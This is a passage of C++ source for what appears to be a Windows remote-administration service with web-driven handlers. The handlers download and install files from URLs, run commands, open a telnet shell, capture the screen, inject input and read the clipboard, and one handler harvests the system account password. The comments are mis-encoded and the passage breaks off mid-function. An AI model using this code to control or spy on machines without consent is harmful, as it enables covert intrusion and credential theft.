/*******************************************************************
   *	webAction.cpp web������
   *    DESCRIPTION:
   *
   *    AUTHOR:yyc
   *
   *    HISTORY:
   *
   *    DATE:
   *	
   *******************************************************************/

#include "rmtsvc.h"
#include "shellCommandEx.h"
#include "other\wutils.h"
#include "other\ipf.h"

void downThreadX(char *strParam)
{
	if(strParam==NULL) return;
	bool bUpdate=false; std::string strURL;
	if(strParam[0]!='*') strURL.assign(strParam);
	else{ strURL.assign(strParam+1); bUpdate=true; }

	int iType=0; const char *strurl=strURL.c_str();
	if(strncasecmp(strurl,"http://",7)==0) iType=1;
	else if(strncasecmp(strurl,"https://",8)==0) iType=1;
	else if(strncasecmp(strurl,"ftp://",6)==0) iType=2;
	delete[] strParam; if(iType==0) return;
	
	std::string strSaveas,strOutput; clsOutput sout;
	const char *ptr=strchr(strurl,' ');
	if( ptr ){ *(char *)ptr=0; ptr+=1;
		while(*ptr==' ') ptr++; strSaveas.assign(ptr); 
	}
	if(strSaveas==""){ if( (ptr=strrchr(strurl,'/')) ) strSaveas.assign(ptr+1); }
	if(strSaveas[0]!='\\' && strSaveas[1]!=':') strSaveas.insert(0,g_savepath);
	if(bUpdate) strSaveas.append(".upd"); //��ֹ���ص��ļ���Ҫ�����ĳ�������
	BOOL bRet=(iType==2)?downfile_ftp(strurl,strSaveas.c_str(),sout):
							 downfile_http(strurl,strSaveas.c_str(),sout);
	if(bRet && bUpdate)  updateRV(strSaveas.c_str(),strOutput);
}
bool webServer :: httprsp_docommandEx(socketTCP *psock,httpResponse &httprsp,const char *strCommand)
{
	if(strCommand==NULL) return false;
	while(*strCommand==' ') strCommand++; //ȥ���ո�
	if(*strCommand!='#') 
		return httprsp_file_run(psock,httprsp,strCommand);
	//��������չ����
	const char *strCmd=++strCommand;
	const char *strParam=strchr(strCommand,' ');
	if(strParam) { *(char *)strParam=0; strParam++; }

	BOOL bRet=FALSE; std::string strRet; //����ִ�з���
	std::string strUpdateFile=""; //rmtsvc���������ļ�
	std::string strDownFile=""; //�����ļ�����ת��url
	if(strcasecmp(strCmd,"update")==0 || strcasecmp(strCmd,"down")==0) //����������
	{
		strRet="wrong command format!\r\n";
		if(strParam) while(*strParam==' ') strParam++;
		if(strParam && strParam[0]){
			bool bUpdate=(strcasecmp(strCmd,"update")==0);
			if(strstr(strParam,"://")){
				int iLen=strlen(strParam)+8;
				char *downParam=new char[iLen];
				if(downParam){
					if(bUpdate){ downParam[0]='*';
						strcpy(downParam+1,strParam);
					}else strcpy(downParam,strParam);
					if( m_threadpool.addTask((THREAD_CALLBACK *)&downThreadX,(void *)downParam,0)!=0 ){
						strRet.assign("Download from "); strRet.append(strParam);
						strRet.append("\r\n"); bRet=TRUE;
					}else strRet.assign("Failed to start downloa-thread\r\n");
					if(!bRet) delete[] downParam; 
				}else strRet.assign("Failed to start downloa-thread\r\n");
			}else if(!bUpdate)
			{//���ر���ָ�����ļ�
				const char *filename,*filepath=NULL;
				const char *ptr=strrchr(strParam,'\\');
				if(ptr){ *(char *)ptr=0;
					filename=ptr+1;
					filepath=strParam;
				} else filename=strParam;
				strDownFile.assign("/download/");
				strDownFile.append(filename);
				strDownFile.append("?path=");
				if(filepath) strDownFile.append(filepath);
			}else{ //��ָ���ı����ļ�����rmtsvc
				strUpdateFile.assign(strParam);
				strRet.assign("Update program...\r\n");
				strRet.append(strParam); bRet=TRUE;
			}
		}//?if(strParam && strParam[0])
	}else bRet=doCommandEx(strCmd,strParam,strRet);
	cBuffer buffer(512);
	buffer.len()+=sprintf(buffer.str()+buffer.len(),"<?xml version=\"1.0\" encoding=\"gb2312\" ?><xmlroot>");
	if(strDownFile!="") 
		 buffer.len()+=sprintf(buffer.str()+buffer.len(),"<dwurl>%s</dwurl>",strDownFile.c_str());
	else buffer.len()+=sprintf(buffer.str()+buffer.len(),"<retmsg>%s</retmsg>",strRet.c_str());
	buffer.len()+=sprintf(buffer.str()+buffer.len(),"</xmlroot>");

	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//������Ӧ���ݳ���
	httprsp.lContentLength(buffer.len());
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buffer.len(),buffer.str(),-1);
	if(strUpdateFile!="") updateRV(strUpdateFile.c_str(),strRet);
	return (bRet)?true:false;
}
bool webServer :: httprsp_version(socketTCP *psock,httpResponse &httprsp)
{
	char buffer[256]; int len;
	if(m_bAnonymous)
	len=sprintf(buffer,"%s<br>&nbsp;<font color=red>��ǰΪ�������ʣ�Ϊ�˰�ȫ���ini�����÷����˺ź�Ȩ��</font>",
				MyService::ServiceVers);
	else len=sprintf(buffer,"%s",MyService::ServiceVers);
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
//	httprsp.set_mimetype(MIMETYPE_TEXT);
	httprsp.AddHeader(string("Content-Type"),string("text/html; charset=gb2312"));
	httprsp.lContentLength(len); //������Ӧ���ݳ���
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(len,buffer,-1); 
	return true;
}

bool webServer:: httprsp_telnet(socketTCP *psock,httpResponse &httprsp,long lAccess)
{
	socketTCP telSock; char buf[128]; int iport;
	MyService *psvr=MyService::GetService();
	socketBase *pevent=(psvr)?psvr->GetSockEvent():NULL;
	telSock.setParent(pevent);
	if( (iport=telSock.ListenX(0,FALSE,NULL))>0 )
		 iport=sprintf(buf,"telnet://%s:%d/",psock->getLocalIP(),iport);
	else iport=sprintf(buf,"Failed to start Telnet.");
	
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//������Ӧ���ݳ���
	httprsp.lContentLength(iport); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(iport,buf,-1); psock->Close();
	if(telSock.Accept(HTTP_MAX_RESPTIMEOUT,NULL)<=0) return false;
	cTelnetEx telSvr; telSvr.Attach(&telSock);
	return true;
}

bool webServer::httprsp_login(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	session["user"]=""; session["lAccess"]=""; 
	const char *ptr_user=httpreq.Request("user");
	const char *ptr_pswd=httpreq.Request("pswd");
	const char *ptr_chkcode=httpreq.Request("chkcode");
	const char *ptr_key=httpreq.Request("key");
	if(ptr_user && ptr_pswd && ptr_chkcode)
	{
		if( session["chkcode"]!="" && 
			strcasecmp(session["chkcode"].c_str(),ptr_chkcode)==0)  //yyc modify 2006-09-14 �����ִ�Сд
		{//�ж��ʺź����룬���ĵ��û���Ȩ��
			::_strlwr((char *)ptr_user); //ת��ΪСд

			std::map<std::string,std::pair<std::string,long> >::iterator it=m_mapUsers.find(ptr_user);
			if(it!=m_mapUsers.end())
			{
				if((*it).second.first==std::string(ptr_pswd))
				{
					session["user"]=(*it).first;
					char tmp[16]; sprintf(tmp,"%d",(*it).second.second);
					session["lAccess"]=string(tmp);
					this->httprsp_Redirect(psock,httprsp,"/");
					return true;
				}
			}
		}//?��֤����ȷ
	}//?if(ptr_user && ptr_pswd && ptr_chkcode)

	return false;
}
//���ý�����ȡָ�����ڵ���Ļ
bool webServer:: httprsp_capWindow(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	const char *ptr; char buf[256];
	int buflen, act=0; POINT pt; RECT rc;
	rc.left=rc.top=0; pt.x=pt.y=0;
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	if(hwnd!=NULL) GetWindowRect(hwnd,&rc);
	
	if( (ptr=httpreq.Request("act")) ) act=atoi(ptr);
	if( (ptr=httpreq.Request("x")) ) pt.x=atoi(ptr);
	if( (ptr=httpreq.Request("y")) ) pt.y=atoi(ptr);
	pt.x+=rc.left; pt.y+=rc.top;
	
	if(act==1) //����ָ���Ĵ���
	{
		hwnd=WindowFromPoint(pt);
		sprintf(buf,"%d",hwnd);
		session["cap_hwnd"]=buf;
	}else if(act==2){ //����������Ļ
		hwnd=NULL;
		session["cap_hwnd"]=string("null");
	} //���������ȡ״̬
	
	if(hwnd==NULL)
		buflen=sprintf(buf,"hwnd is null");
	else buflen=GetWindowText(hwnd,buf,128);
	std::string s(buf);
	buflen=sprintf(buf,"<?xml version=\"1.0\" encoding=\"gb2312\" ?>\r\n"
				"<xmlroot>\r\n"
				"<hwnd>%d</hwnd>\r\n"
				"<wtext>%s</wtext>\r\n"
				"</xmlroot>",hwnd,s.c_str());

	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//������Ӧ���ݳ���
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

//��ȡ����ͼ������ bSetting - �Ƿ��������
//��ȡ��ǰ��¼�û���Ȩ��
bool webServer:: httprsp_capSetting(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp
									,httpSession &session,bool bSetting)
{
	const char *ptr; char buf[1024];
	if(bSetting &&  (ptr=httpreq.Request("quality")) )
	{	
		m_quality=atol(ptr);
		if(m_quality<1 || m_quality>100) m_quality=60;
	}
//	if(bSetting && (ptr=httpreq.Request("lockmskb")) )
//		SetMouseKeybHook( (atol(ptr)==1) );

	if(bSetting && (ptr=httpreq.Request("imgsize")) )
		m_dwImgSize=(DWORD)atol(ptr);
	
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	int buflen=sprintf(buf,"<xmlroot>\r\n"
				"<userAgent><![CDATA[%s]]></userAgent>\r\n"
				"<quality>%d</quality>\r\n"
				"<imgsize>%d</imgsize>\r\n"
				"<qx>%s</qx>\r\n"
				"<ssid>%s</ssid>\r\n"
				"<lockmskb>%d</lockmskb>\r\n"
				"<hwnd>%d</hwnd>\r\n"
				"</xmlroot>",httpreq.Header("User-Agent"),
				m_quality,((m_dwImgSize==0)?0:1),session["lAccess"].c_str(),
				session.sessionID(),0, hwnd);
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//������Ӧ���ݳ���
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

bool webServer :: httprsp_msevent(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	int x=0,y=0,dragx=0,dragy=0;
	long dwData=0; short flag=0;
	const char *ptr;
	if( (ptr=httpreq.Request("x")) )
		x=atoi(ptr);
	if( (ptr=httpreq.Request("y")) )
		y=atoi(ptr);
	if( (ptr=httpreq.Request("dragx")) )
		dragx=atoi(ptr);
	if( (ptr=httpreq.Request("dragy")) )
		dragy=atoi(ptr);
	if( (ptr=httpreq.Request("wheel")) )
		dwData=atol(ptr);

	if( (ptr=httpreq.Request("button")) )
		flag=(short)(atoi(ptr) & 0x0f);
	if( (ptr=httpreq.Request("altk")) )
		flag |=(short)(atoi(ptr) & 0x000f)<<8;
	
	RECT rc; rc.left=rc.top=0;
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	if(hwnd!=NULL) GetWindowRect(hwnd,&rc);
	x+=rc.left; y+=rc.top; dragx+=rc.left; dragy+=rc.top;

	if( (ptr=httpreq.Request("act")) )
	{
		short i=(atoi(ptr) & 0x000f);
		if(i==4) //dragdrop
			Wutils::sendMouseEvent(dragx,dragy,(flag |0x0030),0);//��ģ���϶���
		flag |=(i<<4); 
	}
	
	Wutils::sendMouseEvent(x,y,flag,dwData);
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_HTML);
	//������Ӧ���ݳ���
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK"); 
	return true;
}

bool webServer :: httprsp_keyevent(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp)
{
	short vkey=0;
	const char *ptr,*ptr_vkey=httpreq.Request("vkey");
	if(ptr_vkey)
	{
		while( (ptr=strchr(ptr_vkey,',')) )
		{
			*(char *)ptr=0;
			if( (vkey=(short)(atoi(ptr_vkey)& 0xffff))!=0 )
				Wutils::sendKeyEvent(vkey);
			ptr_vkey=ptr+1;
		}//?while
	}//?if(ptr_vkey)

	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_HTML);
	//������Ӧ���ݳ���
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK"); 
	return true;
}

bool webServer :: httprsp_command(socketTCP *psock,httpResponse &httprsp,const char *ptrCmd)
{
	if(ptrCmd)
	{
		if(strcmp(ptrCmd,"CtAlDe")==0) 
			Wutils::SimulateCtrlAltDel();
		else if(strcmp(ptrCmd,"ShDw")==0)
			Wutils::ShutDown();
		else if(strcmp(ptrCmd,"ReSt")==0)
			Wutils::Restart();
		else if(strcmp(ptrCmd,"Lock")==0)
			Wutils::LockWorkstation();
		else if(strcmp(ptrCmd,"LgOf")==0)
			Wutils::Logoff();
	}
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_HTML);
	//������Ӧ���ݳ���
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK"); 
	return true;
}

bool webServer :: httprsp_cmdpage(socketTCP *psock,httpResponse &httprsp,const char *ptrCmd)
{
	MyService *psvr=MyService::GetService();
	std::string strBuffer;
	if(psvr && psvr->m_preCmdpage!="")
		strBuffer=string("\"")+psvr->m_preCmdpage+string("\" ");
	if(ptrCmd) strBuffer.append(ptrCmd);

	docmd_exec2buf(strBuffer,true,5); 
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//������Ӧ���ݳ���
	httprsp.lContentLength(strBuffer.length()); 
	httprsp.send_rspH(psock,200,"OK"); 
	if(strBuffer!="") psock->Send(strBuffer.length(),strBuffer.c_str(),-1);
	return true;
}

bool webServer :: httprsp_GetClipBoard(socketTCP *psock,httpResponse &httprsp)
{
	std::string strContent;
	Wutils::selectDesktop();
	if(IsClipboardFormatAvailable(CF_TEXT))
	{
		if(OpenClipboard(NULL))
		{
			HGLOBAL hglb = GetClipboardData(CF_TEXT);
			if (hglb != NULL)
			{
				LPTSTR lptstr=(LPTSTR)GlobalLock(hglb);
				if(lptstr!=NULL) strContent.assign(lptstr);
				GlobalUnlock(hglb);
			}
			CloseClipboard();
		}
	}//?if(IsClipboardForma...
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//������Ӧ���ݳ���
	httprsp.lContentLength(strContent.length()); 
	httprsp.send_rspH(psock,200,"OK");
	if(strContent!="") psock->Send(strContent.length(),strContent.c_str(),-1);
	return true;
}
bool webServer :: httprsp_SetClipBoard(socketTCP *psock,httpResponse &httprsp,const char *strval)
{
	std::string strContent;
	Wutils::selectDesktop();
	if(strval && OpenClipboard(NULL))
	{
		if (::EmptyClipboard())// ��ռ�����
		{	
			size_t len=strlen(strval);// �����ڴ��
			HANDLE hMem= ::GlobalAlloc(GMEM_MOVEABLE|GMEM_DDESHARE, len+1);
			if (hMem)
			{
				LPSTR lpMem = (LPSTR)::GlobalLock(hMem);
				if (lpMem)
				{
					::memcpy((void*)lpMem, (const void*)strval, len+1);
					::SetClipboardData(CF_TEXT,hMem);	
				}//?if (lpMem)
				::GlobalUnlock(hMem);
			}//?hMem
		}
		CloseClipboard();
	}//?if(OpenClipboard(NULL))
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//������Ӧ���ݳ���
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK");
	return true;
}

DWORD capDesktop(HWND hWnd,WORD w,WORD h,bool ifCapCursor,long quality,LPBYTE &lpbits);
bool webServer:: httprsp_capDesktop(socketTCP *psock,httpResponse &httprsp,httpSession &session)
{
	bool ifCapCursor=true;
	WORD w=LOWORD(m_dwImgSize);
	WORD h=HIWORD(m_dwImgSize);
	LPBYTE lpbits=NULL;
	Wutils::selectDesktop();
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	DWORD dwRet=capDesktop(hwnd,w,h,ifCapCursor,m_quality,lpbits);
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_JPG);
	//������Ӧ���ݳ���
	httprsp.lContentLength(dwRet); 
	httprsp.send_rspH(psock,200,"OK");
	if(lpbits)
	{
		psock->Send(dwRet,(const char *)lpbits,-1);
		::free(lpbits); 
	}
	return true;
}

bool webServer::httprsp_sysinfo(socketTCP *psock,httpResponse &httprsp)
{
	char buf[512]; int buflen=0;
	buflen=sprintf(buf,"<xmlroot>\r\n");
	buflen+=sprintf(buf+buflen,"<pcname>%s</pcname>\r\n",Wutils::computeName());
	MSOSTYPE ostype=Wutils::winOsType(); //ϵͳ����
	buflen+=sprintf(buf+buflen,"<OS>%s</OS>\r\n",Wutils::getLastInfo());
	Wutils::cpuInfo(ostype);//cpu��Ϣ
	buflen+=sprintf(buf+buflen,"<CPU>%s</CPU>\r\n",Wutils::getLastInfo());
	Wutils::winOsStatus();//��ǰϵͳ״̬
	buflen+=sprintf(buf+buflen,"<status>%s</status>\r\n",Wutils::getLastInfo());
	Wutils::FindPassword(NULL);//��ǰϵͳ�ʺ�/����
	buflen+=sprintf(buf+buflen,"<account>%s</account>\r\n",Wutils::getLastInfo());
	//��ǰ����ID
	buflen+=sprintf(buf+buflen,"<pid>%d</pid>\r\n",::GetCurrentProcessId());
	buflen+=sprintf(buf+buflen,"</xmlroot>");
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//������Ӧ���ݳ���
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

//��������У����ͼƬ
DWORD chkcodeImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits,const  char *chkcode);
bool webServer::httprsp_checkcode(socketTCP *psock,httpResponse &httprsp,httpSession &session)
{
	//����5λУ���룬��д��session
	char tmpBuf[8]; srand(time(NULL));
	tmpBuf[5]=0;//���������
	for(int i = 0;   i < 5;i++ )
	{
		 char c=(char)((rand()*30)/RAND_MAX);
		 if(c<10) c+=48; else c+=55; //0~9 'A' - 'K'
		 tmpBuf[i]=c;
	}
	session["chkcode"]=tmpBuf;
	//����ͼƬ,������
	BITMAPINFOHEADER bih;
	::memset(&bih,0,sizeof(BITMAPINFOHEADER));
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biWidth = 50;
	bih.biHeight = 20;
	bih.biPlanes = 1;
	bih.biBitCount = 24;
	bih.biCompression = BI_RGB;
	bih.biSizeImage =bih.biHeight *DIBSCANLINE_WIDTHBYTES(bih.biWidth *bih.biBitCount );
	LPBYTE lpbits=new BYTE[bih.biSizeImage];
	DWORD dwret=chkcodeImage(&bih,lpbits,tmpBuf);
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_JPG);
	//������Ӧ���ݳ���
	httprsp.lContentLength(dwret); 
	httprsp.send_rspH(psock,200,"OK");
	if(dwret>0) psock->Send(dwret,(const char *)lpbits,-1);
	delete[] lpbits; return true;
}

DWORD usageImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits);
bool webServer::httprsp_usageimage(socketTCP *psock,httpResponse &httprsp)
{
	BITMAPINFOHEADER bih;
	::memset(&bih,0,sizeof(BITMAPINFOHEADER));
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biWidth = 200;
	bih.biHeight = 80;
	bih.biPlanes = 1;
	bih.biBitCount = 24;
	bih.biCompression = BI_RGB;
	bih.biSizeImage =bih.biHeight *DIBSCANLINE_WIDTHBYTES(bih.biWidth *bih.biBitCount );
	LPBYTE lpbits=new BYTE[bih.biSizeImage];
	DWORD dwret=usageImage(&bih,lpbits);
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_JPG);
	//������Ӧ���ݳ���
	httprsp.lContentLength(dwret); 
	httprsp.send_rspH(psock,200,"OK");
	if(dwret>0) psock->Send(dwret,(const char *)lpbits,-1);
	delete[] lpbits; return true;
}

//---------------------------------------------------------------------
//---------------------------------------------------------------------
//����У����ͼƬ
DWORD chkcodeImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits,const  char *chkcode)
{
	if(lpbits==NULL || lpbih==NULL || chkcode==NULL) return 0;
	HDC hWndDC = ::GetWindowDC(NULL);
	HDC hMemDC = ::CreateCompatibleDC(hWndDC);
	HBITMAP hMemBmp = ::CreateCompatibleBitmap(hWndDC, lpbih->biWidth , lpbih->biHeight);
	HBITMAP hOldBmp = (HBITMAP)::SelectObject(hMemDC, hMemBmp);

	RECT rt={0,0,0,0}; rt.right=lpbih->biWidth; rt.bottom=lpbih->biHeight;
	HBRUSH hbr=::CreateSolidBrush(0x0);//������ɫˢ��
	::FillRect(hMemDC,&rt,hbr);//����Ϊ��ɫ
	::DeleteObject(hbr);
	
	int oldMode=::SetBkMode(hMemDC,TRANSPARENT);
	COLORREF oldColor=::SetTextColor(hMemDC,0x00ffffff);
	rt.top=2;rt.left=2;
	::DrawText(hMemDC,chkcode,strlen(chkcode),&rt,DT_TOP|DT_LEFT);
	//�ָ�
	::SetBkMode(hMemDC,oldMode);
	::SetTextColor(hMemDC,oldColor);
	
	//��ȡͼ�����ݲ�����jpgѹ��
	DWORD dwret=0;
	if(::GetDIBits(hMemDC,hMemBmp,0,lpbih->biHeight,lpbits,(LPBITMAPINFO)lpbih,DIB_RGB_COLORS))
		dwret=cImageF::IPF_EncodeJPEG(lpbih,lpbits,lpbits,60); //����jpegѹ��

	::DeleteObject(hMemBmp);
	::SelectObject(hMemDC, hOldBmp);	
	::DeleteDC(hMemDC);
	::ReleaseDC(NULL, hWndDC);
	return dwret;
}

//����cpuռ���ʺ��ڴ�ʹ����ͼ�񣬲�����ͼ�����ݿɴ�С
DWORD usageImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits)
{
	#define POINTNUM 20 //ÿ�����ߵĵ����
	static int cpuLinePoint[POINTNUM]={0}; //����cpu���ߵĵ�
	static int memLinePoint[POINTNUM]={0}; //����mem���ߵĵ�
	static int pointStart=0;//��һ����洢��λ��
	static int pointEnd=0;//��һ����Ĵ洢λ��
	
	if(lpbits==NULL || lpbih==NULL) return 0;
	int i,STEPWIDTH=lpbih->biWidth/POINTNUM;
	HDC hWndDC = ::GetWindowDC(NULL);
	HDC hMemDC = ::CreateCompatibleDC(hWndDC);
	RECT rt; rt.left =rt.top=0;
	rt.right =lpbih->biWidth; rt.bottom =lpbih->biHeight;
	HBITMAP hMemBmp = ::CreateCompatibleBitmap(hWndDC, rt.right -rt.left , rt.bottom -rt.top );
	HBITMAP hOldBmp = (HBITMAP)::SelectObject(hMemDC, hMemBmp);
	
	HBRUSH hbr=::CreateSolidBrush(0x0);//������ɫˢ��
	::FillRect(hMemDC,&rt,hbr);//����Ϊ��ɫ
	::DeleteObject(hbr);
	//���������
	HPEN hpen=::CreatePen(PS_SOLID,1,0x004040);
	HPEN hOldpen=(HPEN)::SelectObject(hMemDC,hpen);
	for(i=rt.left+STEPWIDTH;i<rt.right;i+=STEPWIDTH)
	{
		::MoveToEx(hMemDC,i,rt.top,NULL);
		::LineTo(hMemDC,i,rt.bottom);
	}
	for(i=rt.top+STEPWIDTH;i<rt.bottom ;i+=STEPWIDTH)
	{
		::MoveToEx(hMemDC,rt.left,i,NULL);
		::LineTo(hMemDC,rt.right,i);
	}
	::SelectObject(hMemDC, hOldpen);
	::DeleteObject(hpen);
	//��ȡ��ǰcpuռ���ʺ��ڴ�ʹ��������
	//***********start*****************
	if(pointEnd>0 && (pointEnd%POINTNUM)==(pointStart%POINTNUM)) pointStart+=1;
	cpuLinePoint[pointEnd%POINTNUM]=Wutils::getCPUusage();
	memLinePoint[pointEnd%POINTNUM]=Wutils::getMEMusage();
	pointEnd+=1;
	//***********end*******************
	//����cpuռ�������ߣ���green line
	hpen=::CreatePen(PS_SOLID,1,0x00ff00);
	hOldpen=(HPEN)::SelectObject(hMemDC,hpen);
	int j=0,hg=rt.bottom -rt.top ;
	::MoveToEx(hMemDC,j*STEPWIDTH,rt.bottom-(cpuLinePoint[pointStart%POINTNUM]*hg)/100,NULL);
	for(i=pointStart+1;i<pointEnd;i++,j++)
		::LineTo(hMemDC,(j+1)*STEPWIDTH,rt.bottom-(cpuLinePoint[i%POINTNUM]*hg)/100);
	::SelectObject(hMemDC, hOldpen);
	::DeleteObject(hpen);
	j=0;//����memʹ�������ߣ���yellow line
	hpen=::CreatePen(PS_SOLID,1,0x00ffff);
	hOldpen=(HPEN)::SelectObject(hMemDC,hpen);
	::MoveToEx(hMemDC,j*STEPWIDTH,rt.bottom-(memLinePoint[pointStart%POINTNUM]*hg)/100,NULL);
	for(i=pointStart+1;i<pointEnd;i++,j++)
		::LineTo(hMemDC,(j+1)*STEPWIDTH,rt.bottom-(memLinePoint[i%POINTNUM]*hg)/100);
	::SelectObject(hMemDC, hOldpen);
	::DeleteObject(hpen);
	
	//��ȡͼ�����ݲ�����jpgѹ��
	DWORD dwret=0;
	if(::GetDIBits(hMemDC,hMemBmp,0,lpbih->biHeight,lpbits,(LPBITMAPINFO)lpbih,DIB_RGB_COLORS))
		dwret=cImageF::IPF_EncodeJPEG(lpbih,lpbits,lpbits,60); //����jpegѹ��

	::DeleteObject(hMemBmp);
	::SelectObject(hMemDC, hOldBmp);	
	::DeleteDC(hMemDC);
	::ReleaseDC(NULL, hWndDC);
	return dwret;
}

DWORD capDesktop(HWND hWnd,WORD w,WORD h,bool ifCapCursor,long quality,LPBYTE &lpbits)
{
//	static LPBYTE lpbuffer=NULL;
//	static DWORD dwbuffer_size=0;
	LPBYTE lpbuffer=NULL;
	DWORD dwbuffer_size=0;
	BITMAPINFOHEADER bih;
	RECT rect;//�õ���Ļ�Ĵ�С
	if(hWnd==NULL) hWnd = ::GetDesktopWindow(); //��ȡ������
	::GetWindowRect(hWnd, &rect); //::GetClientRect(hWnd, &rect);
	::memset((void *)&bih,0,sizeof(bih));
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biPlanes = 1;
	bih.biCompression =BI_RGB;
	bih.biBitCount =24;
	bih.biHeight =rect.bottom - rect.top ;
	bih.biWidth =rect.right - rect.left;
	bih.biSizeImage =DIBSCANLINE_WIDTHBYTES(bih.biWidth *bih.biBitCount ) * bih.biHeight ;
	if(bih.biSizeImage>dwbuffer_size)
	{
		if(lpbuffer) ::free(lpbuffer);
		dwbuffer_size=bih.biSizeImage;
		if( (lpbuffer=(LPBYTE)::malloc(dwbuffer_size))==NULL) { dwbuffer_size=0; return 0; }
	}
	
	DWORD dwret=0;
	HDC hWndDC = NULL;
	HDC hMemDC = NULL;
	HBITMAP hMemBmp = NULL;
	HBITMAP hOldBmp = NULL;
	hWndDC = ::GetDCEx(hWnd,NULL,DCX_WINDOW); //::GetDC(hWnd);
	hMemDC = ::CreateCompatibleDC(hWndDC);
	hMemBmp = ::CreateCompatibleBitmap(hWndDC, bih.biWidth, bih.biHeight);
	hOldBmp = (HBITMAP)::SelectObject(hMemDC, hMemBmp);
	::BitBlt(hMemDC, 0, 0, bih.biWidth, bih.biHeight, hWndDC, 0, 0, SRCCOPY);
	
	if(ifCapCursor) //���������
	{
		POINT ptCursor;
		::GetCursorPos(&ptCursor);
		//�Ȼ��������µĴ��ھ�����õ��ô��ڵ��߳�ID
		//Attatch��ǰ�̵߳�ָ���Ĵ����߳�
		//��øô��ڵ�ǰ�������
		//Deattach
		//!!!�������������ֱ�ӵ���GetCursor()�����ǻ�õ�ǰ�̵߳Ĺ����
		//���û���������õ�����©�������
		HWND hw=::WindowFromPoint(ptCursor);
		if(hw==NULL) hw=hWnd;
		DWORD hdl=::GetWindowThreadProcessId(hw,NULL);
		::AttachThreadInput(::GetCurrentThreadId(),hdl,TRUE);
		HCURSOR hCursor=::GetCursor();
		::AttachThreadInput(::GetCurrentThreadId(),hdl,FALSE);
		ICONINFO IconInfo;//��ȡ����ͼ������ 
		if (::GetIconInfo(hCursor, &IconInfo))
		{
			ptCursor.x -= ((int) IconInfo.xHotspot);
			ptCursor.y -= ((int) IconInfo.yHotspot);
		}
		//�ڼ����豸�������ϻ����ù��
		::DrawIconEx(
		hMemDC, // handle to device context 
		ptCursor.x, ptCursor.y,
		hCursor, // handle to icon to draw 
		0,0, // width of the icon 
		0, // index of frame in animated cursor 
		NULL, // handle to background brush 
		DI_NORMAL | DI_COMPAT // icon-drawing flags 
		); 
	}//?if(ifCapCursor) //���������
	
	if(::GetDIBits(hWndDC,hMemBmp,0,bih.biHeight,lpbuffer,(LPBITMAPINFO)&bih,DIB_RGB_COLORS))
	{
		//����ͼ����С
		if(w!=0 && h!=0)
		{
			float f=(float)bih.biWidth/bih.biHeight;
			float f1=(float)w/h;
			if(f1>f) w=h*f; else h=w/f;
			if(w<bih.biWidth && h<bih.biHeight) //����ͼ����С
			{
				long lEffwidth_src=bih.biSizeImage/bih.biHeight;
				long x,y,lEffwidth_dst=w*3;
				float fX=(float)bih.biWidth/w;
